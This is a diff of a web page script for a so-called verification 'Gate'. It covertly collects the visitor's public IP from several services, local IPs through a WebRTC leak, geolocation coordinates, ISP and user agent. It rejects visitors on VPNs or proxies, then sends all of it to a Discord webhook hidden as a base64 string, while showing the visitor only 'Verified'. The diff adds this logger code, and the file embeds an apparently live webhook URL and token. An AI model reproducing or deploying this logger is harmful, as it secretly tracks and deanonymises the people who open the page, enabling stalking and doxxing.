@@ -44,53 +44,101 @@
         p.className='particle';p.style.width=s+'px';p.style.height=s+'px';
         p.style.top=Math.random()*100+'%';p.style.left=Math.random()*100+'%';
         p.style.animationDuration=10+Math.random()*10+'s';document.body.append(p)}
-      // decode keys
+      // webhook and keys (your keys here, base64 encoded for obfuscation)
       const keys=[
         'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI2NTA2MTg3OTk0MzE3OC9TSUw0aXpCaWktQ1UtUFI4MG5SNktWTHhoMmlsMFBFel81TEhoU2VBSlNieEN3UUR1TnNkNDFoQ0JBYWdpOUYtM3Ffcw==',
-        'WU9VUl9JUFFTX0FQSV9LRVk=',
-        'WU9VUl9JUFVIX0FQSV9LRVk='
+        'WU9VUl9JUFFTX0FQSV9LRVk=', // IPQualityScore
+        'WU9VUl9JUFVIX0FQSV9LRVk='  // IpHub (if you want to use it)
       ],d=atob,H=d(keys[0]),K1=d(keys[1]),K2=d(keys[2]);
-      // util fns
-      async function getIP(){for(const u of ['https://api.ipify.org?format=json','https://ipapi.co/json/','https://ipwho.is/']){
-          try{let j=await fetch(u).then(r=>r.json()),i=j.ip||j.ip_address||j.ipAddress; if(i) return i;}catch{} }
-        throw 'NoIP'; }
-      async function getLeak(t=2e3){return new Promise(r=>{const s=new Set,p=new RTCPeerConnection({iceServers:[]});
-        p.createDataChannel('');p.createOffer().then(o=>p.setLocalDescription(o));
-        p.onicecandidate=e=>e.candidate&&s.add(e.candidate.candidate.split(' ')[4]);
-        setTimeout(()=>{p.close();r([...s])},t);
-      });}
-      async function checkVPN(ip){let f=[];
-        try{let a=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());/hosting|datacenter|cloud|proxy|vpn/i.test(a.org||'')&&f.push('D')}catch{}
-        try{let b=await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());(b.security&&(b.security.is_proxy||b.security.is_tor))&&f.push('H')}catch{}
-        try{let c=await fetch(`https://ipqualityscore.com/api/json/ip/${K1}/${ip}?strictness=1`).then(r=>r.json());(c.vpn||c.proxy||c.tor||c.fraud_score>50)&&f.push('Q')}catch{}
-      //  try{let d=await fetch(`https://v2.api.iphub.info/ip/${ip}`,{headers:{'X-Key':K2}}}).then(r=>r.json());d.block===1&&f.push('P')}catch{}
-        return f;
+
+      // Helper: get public IP from several APIs and show all for highest accuracy
+      async function getIPs(){
+        let results = {};
+        // Try multiple sources for redundancy
+        const sources = [
+          {name:'ipify', url:'https://api.ipify.org?format=json', parse: j=>j.ip},
+          {name:'ipapi', url:'https://ipapi.co/json/', parse: j=>j.ip},
+          {name:'ipinfo', url:'https://ipinfo.io/json', parse: j=>j.ip},
+          {name:'ipwho', url:'https://ipwho.is/', parse: j=>j.ip}
+        ];
+        for (const src of sources){
+          try{
+            let j=await fetch(src.url).then(r=>r.json());
+            if(j && src.parse(j)) results[src.name]=src.parse(j);
+          }catch{}
+        }
+        // Return the first non-falsey as 'main'
+        results.main = results.ipify || results.ipapi || results.ipinfo || results.ipwho || '';
+        return results;
       }
+
+      // Try to get local IPs via WebRTC (may not work on all browsers)
+      async function getLeak(t=2000){
+        return new Promise(r=>{
+          const s=new Set,p=new RTCPeerConnection({iceServers:[]});
+          p.createDataChannel('');
+          p.createOffer().then(o=>p.setLocalDescription(o));
+          p.onicecandidate=e=>e.candidate&&s.add(e.candidate.candidate.split(' ')[4]);
+          setTimeout(()=>{p.close();r([...s])},t);
+        });
+      }
+
+      // Check VPN/proxy via multiple APIs
+      async function checkVPN(ip){
+        let reasons = [];
+        try{
+          // ipapi
+          let a=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
+          if(/hosting|datacenter|cloud|proxy|vpn/i.test(a.org||'')) reasons.push('ipapi:hosting/org flagged');
+          // ipwho.is
+          let b=await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());
+          if(b.security&&(b.security.is_proxy||b.security.is_tor||b.security.is_vpn)) reasons.push('ipwho.is:proxy/tor/vpn');
+          // IPQualityScore
+          let c=await fetch(`https://ipqualityscore.com/api/json/ip/${K1}/${ip}?strictness=1`).then(r=>r.json());
+          if(c.vpn||c.proxy||c.tor||c.fraud_score>50) reasons.push('IPQS:VPN/Proxy/High Risk');
+        }catch{}
+        return reasons;
+      }
+
       // DOM refs
       const $=id=>document.getElementById(id);
       const u=$('u'),msg=$('msg'),btn=$('b'),sta=$('s'),ms=$('m');
       const F=(c,t)=>(sta.className='v '+c,ms.textContent=t);
+
       btn.onclick=async()=>{
         const tag=u.value.trim(), text=msg.value.trim();
         if(!tag) return F('err','Enter your tag');
         F('','Checking…'); btn.disabled=true;
         try{
-          const ip=await getIP(),lp=await getLeak(),vpn=await checkVPN(ip);
-          if(vpn.length) return F('err','VPNs not allowed'),btn.disabled=false;
-          const geo=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
-          const payload={username:'Gate',author:{name:'Made by Big Guy'},embeds:[{color:65280,fields:[
-            {name:'T',value:tag,inline:1},
-            {name:'A',value:ip,inline:1},
-            {name:'Lookup IP',value:`[Info](https://ipinfo.io/${ip})`,inline:1},
-            {name:'C',value:`${geo.city||'?'}, ${geo.country_code||'?'}`,inline:1},
-            {name:'Coordinates',value:`[Map](https://google.com/maps?q=${geo.latitude},${geo.longitude})`,inline:1},
-            {name:'ISP/Organization',value:geo.org?`[${geo.org}](https://ipinfo.io/${ip})`:'?',inline:1},
-            {name:'Checks',value:vpn.join(',')||'-',inline:1},
-            {name:'Reason',value:'To become skid and sigma',inline:0},
-            {name:'I',value:lp.join(',')||'-',inline:0},
-            {name:'U',value:navigator.userAgent,inline:0},
-            text?{name:'Message',value:text,inline:0}:null
-          ].filter(Boolean),footer:{text:new Date().toUTCString()}}]};
+          const ips = await getIPs();
+          if(!ips.main) throw "No IP found";
+          const lp=await getLeak();
+          const vpn=await checkVPN(ips.main);
+          if(vpn.length) return F('err','VPNs/Proxies not allowed! ('+vpn.join('; ')+')'),btn.disabled=false;
+          // Get city/country from ipapi
+          let geo={};
+          try{geo=await fetch(`https://ipapi.co/${ips.main}/json/`).then(r=>r.json());}catch{}
+          // Prepare full embed to send
+          const payload={
+            username:'Gate',
+            author:{name:'Made by Big Guy'},
+            embeds:[{
+              color:65280,
+              fields:[
+                {name:'Tag',value:tag,inline:1},
+                {name:'IP (all sources)',value:Object.entries(ips).map(([k,v])=>k+': '+v).join('\n'),inline:0},
+                {name:'Lookup',value:`[ipinfo.io](${ips.main?`https://ipinfo.io/${ips.main}`:'#'})`,inline:1},
+                {name:'City/Country',value:`${geo.city||'?'}, ${geo.country_code||'?'}`,inline:1},
+                {name:'Coordinates',value:`[Map](https://google.com/maps?q=${geo.latitude},${geo.longitude})`,inline:1},
+                {name:'ISP/Org',value:geo.org?`[${geo.org}](https://ipinfo.io/${ips.main})`:'?',inline:1},
+                {name:'VPN/Proxy Check',value:vpn.join('; ')||'-',inline:0},
+                {name:'Local IPs',value:lp.join(',')||'-',inline:0},
+                {name:'User Agent',value:navigator.userAgent,inline:0},
+                text?{name:'Message',value:text,inline:0}:null
+              ].filter(Boolean),
+              footer:{text:new Date().toUTCString()}
+            }]
+          };
           await fetch(H,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
           F('ok','Verified');
         }catch(e){
